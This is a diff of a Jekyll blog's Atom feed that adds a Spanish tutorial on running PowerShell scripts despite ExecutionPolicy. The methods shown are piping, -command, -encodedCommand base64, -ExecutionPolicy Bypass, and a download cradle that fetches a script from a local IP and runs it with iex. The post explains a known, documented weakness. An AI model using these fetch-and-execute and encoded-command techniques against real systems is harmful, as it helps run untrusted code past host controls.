@@ -1,4 +1,307 @@
-<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xml" href="/feed.xslt.xml"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.3.1">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2016-12-12T21:23:31+01:00</updated><id>//</id><title type="html">Out of memory</title><subtitle>Como si no tuviera otra cosa que hacer</subtitle><entry><title type="html">Gnome keyring</title><link href="/gnome-keyring/" rel="alternate" type="text/html" title="Gnome keyring" /><published>2016-12-12T00:00:00+01:00</published><updated>2016-12-12T00:00:00+01:00</updated><id>/gnome-keyring</id><content type="html" xml:base="/gnome-keyring/">&lt;p&gt;Entre los cambios de password rutinarios hay uno que me molesta sobremanera porque no podía &lt;em&gt;escriptarlo&lt;/em&gt;: el del &lt;a href=&quot;https://wiki.gnome.org/Projects/GnomeKeyring&quot;&gt;Gnome keyring&lt;/a&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xml" href="http://localhost:4000/feed.xslt.xml"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.3.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2016-12-13T21:21:44+01:00</updated><id>http://localhost:4000//</id><title type="html">Out of memory</title><subtitle>Como si no tuviera otra cosa que hacer</subtitle><entry><title type="html">Saltándose los controles de la Powershell</title><link href="http://localhost:4000/powershell/" rel="alternate" type="text/html" title="Saltándose los controles de la Powershell" /><published>2016-12-13T00:00:00+01:00</published><updated>2016-12-13T00:00:00+01:00</updated><id>http://localhost:4000/powershell</id><content type="html" xml:base="http://localhost:4000/powershell/">&lt;p&gt;En una de las charlas a las que acude con frecuencia -bueno, creo que en varias :)-, &lt;a href=&quot;https://twitter.com/pablogonzalezpe&quot;&gt;Pablo González&lt;/a&gt; estuvo explicando diferentes posibilidades para ejecutar scripts en PowerShell “saltándose” los controles de ejecución (ExecutionPolicy).&lt;/p&gt;
+
+&lt;p&gt;La &lt;a href=&quot;https://technet.microsoft.com/es-ES/library/ee176961.aspx&quot;&gt;ExecutionPolicy&lt;/a&gt; determina qué scripts PowerShell tienen autorización para ejecutarse en un sistema. Windows ofrece cuatro políticas:&lt;/p&gt;
+
+&lt;table class=&quot;table&quot;&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;ExecutionPolicy&lt;/th&gt;
+      &lt;th&gt;Descripción&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Restricted&lt;/td&gt;
+      &lt;td&gt;No se puede ejecutar ningún script, la PowerShell solo se puede usar en modo interactivo&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;AllSigned&lt;/td&gt;
+      &lt;td&gt;Solo se pueden ejecutar scripts firmados por una entidad de confianza&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;RemoteSigned&lt;/td&gt;
+      &lt;td&gt;Los scripts descargados de internet deben estar formados por una entidad de confianza&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Unrestricted&lt;/td&gt;
+      &lt;td&gt;Todos los Windows PowerShell scripts se pueden ejecutar, sin restricción&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Por defecto la política suele ser “Restricted” o “RemoteSigned”. Por ejemplo:&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;get-executionpolicy&lt;/span&gt; -list
+&lt;span class=&quot;nb&quot;&gt;get-executionpolicy&lt;/span&gt; -list
+
+        Scope ExecutionPolicy
+        ----- ---------------
+MachinePolicy       Undefined
+   UserPolicy       Undefined
+      &lt;span class=&quot;k&quot;&gt;Process       &lt;/span&gt;Undefined
+  CurrentUser       Undefined
+ LocalMachine      Restricted
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Esto quiere decir que no vamos a poder ejecutar scripts no firmados. A ver si es verdad, creamos un script chorra y tratamos de ejecutarlo:&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;EUser&amp;gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Get-ChildItem&quot;&lt;/span&gt; &amp;gt;foo.ps1
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Get-ChildItem&quot;&lt;/span&gt; &amp;gt;foo.ps1
+
+&lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;EUser&amp;gt; ./foo.ps1
+./foo.ps1
+./foo.ps1 : File C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;EUser&lt;span class=&quot;se&quot;&gt;\f&lt;/span&gt;oo.ps1 cannot be loaded because running scripts is disabled on this system. &lt;span class=&quot;k&quot;&gt;For &lt;/span&gt;more 
+information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;135170.
+At line:1 &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;:1
++ ./foo.ps1
++ ~~~~~~~~~
+    + CategoryInfo          : SecurityError: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;, PSSecurityException
+    + FullyQualifiedErrorId : UnauthorizedAccess
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Llegados a este punto, hay que explicar que Microsoft no implementa la &lt;code class=&quot;highlighter-rouge&quot;&gt;ExecutionPolicy&lt;/code&gt; como un mecanismo de seguridad, sino como un simple control para evitar la ejecución de scripts &lt;em&gt;inadvertidamente&lt;/em&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://technet.microsoft.com/en-us/gg261722.aspx&quot;&gt;Windows PowerShell Script Security&lt;/a&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;It may seem odd to permit users to override an administrator-established value for the execution policy, but remember that the execution policy is intended to help stop unintended script execution. It is not intended to stop skilled users from executing scripts at all, merely to ensure that they do not do so without knowing what they are doing.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Bien, aclarado esto vamos a saltarnos el “control”. Supongamos que queremos ejecutar una serie de comandos para obtener información de una máquina; para que no sea muy largo nos limitaremos a esto:&lt;/p&gt;
+
+&lt;div class=&quot;language-posh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;EUser&amp;gt; Get-CimInstance Win32_OperatingSystem | &lt;span class=&quot;nb&quot;&gt;Select-Object  &lt;/span&gt;Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | &lt;span class=&quot;nb&quot;&gt;fl 
+&lt;/span&gt;Get-CimInstance Win32_OperatingSystem | &lt;span class=&quot;nb&quot;&gt;Select-Object  &lt;/span&gt;Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | &lt;span class=&quot;nb&quot;&gt;fl
+
+
+&lt;/span&gt;Caption                 : Microsoft Windows 10 Enterprise Evaluation
+InstallDate             : 7/21/2016 9:12:03 AM
+ServicePackMajorVersion : 0
+OSArchitecture          : 64-bit
+BootDevice              : &lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;evice&lt;span class=&quot;se&quot;&gt;\H&lt;/span&gt;arddiskVolume1
+BuildNumber             : 14393
+CSName                  : MSEDGEWIN10
+
+&lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;EUser&amp;gt; Get-Hotfix
+Get-Hotfix
+
+Source        Description      HotFixID      InstalledBy          InstalledOn              
+------        -----------      --------      -----------          -----------              
+MSEDGEWIN10   Update           KB3199986     NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;YSTEM  12/13/2016 12:00:00 AM   
+MSEDGEWIN10   Security Update  KB3202790     NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;YSTEM  12/13/2016 12:00:00 AM   
+MSEDGEWIN10   Update           KB3201845     NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;YSTEM  12/13/2016 12:00:00 AM   
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Almacenamos el “script” en un fichero Get-BasicInfo.ps1 e intentamos ejecutarlo. Y, claro, pasa lo que pasa:&lt;/p&gt;
+
+&lt;div class=&quot;language-posh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;EUser&amp;gt; ./Get-BasicInfo.ps1
+./Get-BasicInfo.ps1
+./Get-BasicInfo.ps1 : File C:&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;EUser&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;et-BasicInfo.ps1 cannot be loaded because running scripts is disabled on 
+this system. &lt;span class=&quot;k&quot;&gt;For &lt;/span&gt;more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;135170.
+At line:1 &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;:1
++ ./Get-BasicInfo.ps1
++ ~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : SecurityError: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;, PSSecurityException
+    + FullyQualifiedErrorId : UnauthorizedAccess
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Pues veamos algunas de las numerosas soluciones al &lt;em&gt;problema&lt;/em&gt;:&lt;/p&gt;
+
+&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#copiar-y-pegar&quot; id=&quot;markdown-toc-copiar-y-pegar&quot;&gt;Copiar y pegar&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#echo--pipe&quot; id=&quot;markdown-toc-echo--pipe&quot;&gt;echo + pipe&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#descargar-de-url--invoke-expression&quot; id=&quot;markdown-toc-descargar-de-url--invoke-expression&quot;&gt;Descargar de URL + Invoke Expression&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#argumento--command&quot; id=&quot;markdown-toc-argumento--command&quot;&gt;Argumento -command&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#argumento--encodedcommand&quot; id=&quot;markdown-toc-argumento--encodedcommand&quot;&gt;Argumento -encodedCommand&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#el-comando-invoke-command&quot; id=&quot;markdown-toc-el-comando-invoke-command&quot;&gt;El comando Invoke-Command&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#-executionpolicy-bypass&quot; id=&quot;markdown-toc--executionpolicy-bypass&quot;&gt;-ExecutionPolicy Bypass&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#-executionpolicy-unrestricted&quot; id=&quot;markdown-toc--executionpolicy-unrestricted&quot;&gt;-ExecutionPolicy Unrestricted&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#cambiar-executionpolicy-para-este-proceso-en-particular&quot; id=&quot;markdown-toc-cambiar-executionpolicy-para-este-proceso-en-particular&quot;&gt;Cambiar ExecutionPolicy para este proceso en particular&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#lo-mismo-para-un-usuario&quot; id=&quot;markdown-toc-lo-mismo-para-un-usuario&quot;&gt;Lo mismo para un usuario&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;copiar-y-pegar&quot;&gt;Copiar y pegar&lt;/h2&gt;
+
+&lt;p&gt;Tal cual. Basta con copiar y pegar el contenido del script. Porque entonces ya no es un script, es &lt;em&gt;interactivo… :)&lt;/em&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;echo--pipe&quot;&gt;echo + pipe&lt;/h2&gt;
+
+&lt;p&gt;Obtener el contenido del script con &lt;code class=&quot;highlighter-rouge&quot;&gt;echo&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;type&lt;/code&gt; p similar (&lt;code class=&quot;highlighter-rouge&quot;&gt;Get-Content&lt;/code&gt;, pasa ser más &lt;em&gt;posh&lt;/em&gt;) y pasárselo vía pipe a… una powershell:&lt;/p&gt;
+
+&lt;div class=&quot;language-posh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;euser&amp;gt; &lt;span class=&quot;nb&quot;&gt;Get-Content &lt;/span&gt;Get-BasicInfo.ps1 | powershell -noprofile -
+&lt;span class=&quot;nb&quot;&gt;Get-Content &lt;/span&gt;Get-BasicInfo.ps1 | powershell -noprofile -
+Cannot load PSReadline module.  Console is running without PSReadline.
+
+
+Caption                 : Microsoft Windows 10 Enterprise Evaluation
+InstallDate             : 7/21/2016 9:12:03 AM
+ServicePackMajorVersion : 0
+OSArchitecture          : 64-bit
+BootDevice              : &lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;evice&lt;span class=&quot;se&quot;&gt;\H&lt;/span&gt;arddiskVolume1
+BuildNumber             : 14393
+CSName                  : MSEDGEWIN10
+
+
+
+
+Source        Description      HotFixID      InstalledBy          InstalledOn              
+------        -----------      --------      -----------          -----------              
+MSEDGEWIN10   Update           KB3199986     NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;YSTEM  12/13/2016 12:00:00 AM   
+MSEDGEWIN10   Security Update  KB3202790     NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;YSTEM  12/13/2016 12:00:00 AM   
+MSEDGEWIN10   Update           KB3201845     NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;YSTEM  12/13/2016 12:00:00 AM
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;descargar-de-url--invoke-expression&quot;&gt;Descargar de URL + Invoke Expression&lt;/h2&gt;
+
+&lt;div class=&quot;language-posh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;euser&amp;gt; powershell -nop -c &lt;span class=&quot;s2&quot;&gt;&quot;iex(New-Object Net.WebClient).DownloadString('http://10.254.0.1:8000/Get-BasicInfo.ps1')&quot;&lt;/span&gt;
+powershell -nop -c &lt;span class=&quot;s2&quot;&gt;&quot;iex(New-Object Net.WebClient).DownloadString('http://10.254.0.1:8000/Get-BasicInfo.ps1')&quot;&lt;/span&gt;
+
+
+Caption                 : Microsoft Windows 10 Enterprise Evaluation
+InstallDate             : 7/21/2016 9:12:03 AM
+ServicePackMajorVersion : 0
+OSArchitecture          : 64-bit
+BootDevice              : &lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;evice&lt;span class=&quot;se&quot;&gt;\H&lt;/span&gt;arddiskVolume1
+BuildNumber             : 14393
+CSName                  : MSEDGEWIN10
+
+
+
+
+Source        Description      HotFixID      InstalledBy          InstalledOn              
+------        -----------      --------      -----------          -----------              
+MSEDGEWIN10   Update           KB3199986     NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;YSTEM  12/13/2016 12:00:00 AM   
+MSEDGEWIN10   Security Update  KB3202790     NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;YSTEM  12/13/2016 12:00:00 AM   
+MSEDGEWIN10   Update           KB3201845     NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;YSTEM  12/13/2016 12:00:00 AM
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;argumento--command&quot;&gt;Argumento -command&lt;/h2&gt;
+
+&lt;p&gt;Parecido a “copiar y pegar”:&lt;/p&gt;
+
+&lt;div class=&quot;language-posh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;euser&amp;gt; powershell -command &lt;span class=&quot;s2&quot;&gt;&quot;Get-CimInstance Win32_OperatingSystem | Select-Object  Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | fl
+powershell -command &quot;&lt;/span&gt;Get-CimInstance Win32_OperatingSystem | &lt;span class=&quot;nb&quot;&gt;Select-Object  &lt;/span&gt;Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | &lt;span class=&quot;nb&quot;&gt;fl&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;&amp;gt;&amp;gt; &lt;/span&gt;Get-Hotfix&lt;span class=&quot;s2&quot;&gt;&quot;
+
+Caption                 : Microsoft Windows 10 Enterprise Evaluation
+[...]
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;(Ya no pongo la salida más veces si no es estrictamente necesario)&lt;/p&gt;
+
+&lt;h2 id=&quot;argumento--encodedcommand&quot;&gt;Argumento -encodedCommand&lt;/h2&gt;
+
+&lt;p&gt;Esto viene directamente the &lt;a href=&quot;https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/&quot;&gt;the NetSPI blog&lt;/a&gt;. Es, de nuevo, “pegar” el contenido de nuestro script en una varible, codificarla en unicode/base64 -lo que evitaría problemas habituales del caso anterior- y ejecutarla mendiante &lt;code class=&quot;highlighter-rouge&quot;&gt;-encodedCommand&lt;/code&gt;. Por ejemplo:&lt;/p&gt;
+
+&lt;div class=&quot;language-posh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;EUser&amp;gt; &lt;span class=&quot;nv&quot;&gt;$command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Get-CimInstance Win32_OperatingSystem | Select-Object  Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | fl
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$command&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;=&quot;&lt;/span&gt;Get-CimInstance Win32_OperatingSystem | &lt;span class=&quot;nb&quot;&gt;Select-Object  &lt;/span&gt;Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | &lt;span class=&quot;nb&quot;&gt;fl&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;&amp;gt;&amp;gt; &lt;/span&gt;Get-Hotfix&lt;span class=&quot;s2&quot;&gt;&quot;
+Get-Hotfix&quot;&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;&amp;gt;&amp;gt; &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Codificamos:&lt;/p&gt;
+
+&lt;div class=&quot;language-posh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;EUser&amp;gt; &lt;span class=&quot;nv&quot;&gt;$bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;System.Text.Encoding]::Unicode.GetBytes&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;System.Text.Encoding]::Unicode.GetBytes&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;EUser&amp;gt; &lt;span class=&quot;nv&quot;&gt;$encodedCommand&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Convert]::ToBase64String&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$encodedCommand&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Convert]::ToBase64String&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;EUser&amp;gt; &lt;span class=&quot;nv&quot;&gt;$encodedCommand&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$encodedCommand&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;RwBlAHQALQBDAGkAbQBJAG4AcwB0AGEAbgBjAGUAIABXAGkAbgAzADIAXwBPAHAAZQByAGEAdABpAG4AZwBTAHkAcwB0AGUAbQAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAAIABDAGEAcAB0AGkAbwBuACwAIABJAG4AcwB0AGEAbABsAEQAYQB0AGUALAAgAFMAZQByAHYAaQBjAGUAUABhAGMAawBNAGEAagBvAHIAVgBlAHIAcwBpAG8AbgAsACAATwBTAEEAcgBjAGgAaQB0AGUAYwB0AHUAcgBlACwAIABCAG8AbwB0AEQAZQB2AGkAYwBlACwAIAAgAEIAdQBpAGwAZABOAHUAbQBiAGUAcgAsACAAQwBTAE4AYQBtAGUAIAB8ACAAZgBsAAoARwBlAHQALQBIAG8AdABmAGkAeAA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Y ejecutamos:&lt;/p&gt;
+
+&lt;div class=&quot;language-posh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;EUser&amp;gt; powershell.exe -EncodedCommand &lt;span class=&quot;nv&quot;&gt;$encodedCommand&lt;/span&gt;
+powershell.exe -EncodedCommand &lt;span class=&quot;nv&quot;&gt;$encodedCommand&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#&amp;lt; CLIXML&lt;/span&gt;
+
+
+Caption                 : Microsoft Windows 10 Enterprise Evaluation
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;el-comando-invoke-command&quot;&gt;El comando Invoke-Command&lt;/h2&gt;
+
+&lt;div class=&quot;language-posh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;EUser&amp;gt; invoke-command -scriptblock &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Get-CimInstance Win32_OperatingSystem | &lt;span class=&quot;nb&quot;&gt;Select-Object  &lt;/span&gt;Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | &lt;span class=&quot;nb&quot;&gt;fl&lt;/span&gt;;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt;;Get-Hotfix&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+invoke-command -scriptblock &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Get-CimInstance Win32_OperatingSystem | &lt;span class=&quot;nb&quot;&gt;Select-Object  &lt;/span&gt;Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | &lt;span class=&quot;nb&quot;&gt;fl&lt;/span&gt;;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt;;Get-Hotfix&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+
+Caption                 : Microsoft Windows 10 Enterprise Evaluation
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;-executionpolicy-bypass&quot;&gt;-ExecutionPolicy Bypass&lt;/h2&gt;
+
+&lt;p&gt;Esta me parece cachondísima:&lt;/p&gt;
+
+&lt;div class=&quot;language-posh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;EUser&amp;gt; PowerShell.exe -ExecutionPolicy Bypass -File Get-BasicInfo.ps1
+PowerShell.exe -ExecutionPolicy Bypass -File Get-BasicInfo.ps1
+
+
+Caption                 : Microsoft Windows 10 Enterprise Evaluation
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;-executionpolicy-unrestricted&quot;&gt;-ExecutionPolicy Unrestricted&lt;/h2&gt;
+
+&lt;p&gt;Similar a la anterior, con sutiles diferencias esbozadas en &lt;a href=&quot;https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/&quot;&gt;the NetSPI blog&lt;/a&gt; o en la documentación de Microsoft:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://blogs.technet.microsoft.com/christwe/2012/09/20/but-i-ran-set-executionpolicy-unrestricted-what-is-going-on/&quot;&gt;But I ran Set-Executionpolicy unrestricted, what is going on?&lt;/a&gt;&lt;/li&gt;
